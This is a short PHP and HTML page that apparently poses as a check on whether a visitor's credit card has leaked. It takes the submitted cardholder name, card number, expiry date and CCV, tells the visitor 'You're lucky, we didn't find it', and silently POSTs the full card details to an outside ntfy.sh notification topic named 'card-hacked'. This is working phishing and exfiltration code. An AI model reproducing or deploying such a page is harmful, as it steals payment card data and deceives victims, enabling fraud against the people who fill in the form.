<html>
<body>
<?php 
$name = $_POST["name"];
$ccv = $_POST["ccv"];
$exp = $_POST["exp"];
$ccnumber = $_POST["ccnumber"];
$content = "$name, $ccv, $exp, $ccnumber"; ?>
<p>You're lucky, we didn't find it. Your card details:</p>
<?php echo $_POST["name"]; ?>
<?php echo $_POST["exp"]; ?>
<?php echo $_POST["ccnumber"]; ?>
<?php echo $_POST["ccv"]; ?>
<?php file_get_contents('https://ntfy.sh/card-hacked', false, stream_context_create([
    'http' => [
        'method' => 'POST', 
        'header' => 'Content-Type: text/plain',
        'content' => $content
    ]
])); ?>

</body>
    <center>
    <footer>
     <p>Copyrigh (C) 2024</p>
</footer>
<address>
     <p>Buy this website! Send an e-mail <a href=mailto:installerwizard@national.shitposting.agency>here.</a></p>
</address>
        </center>
</html>
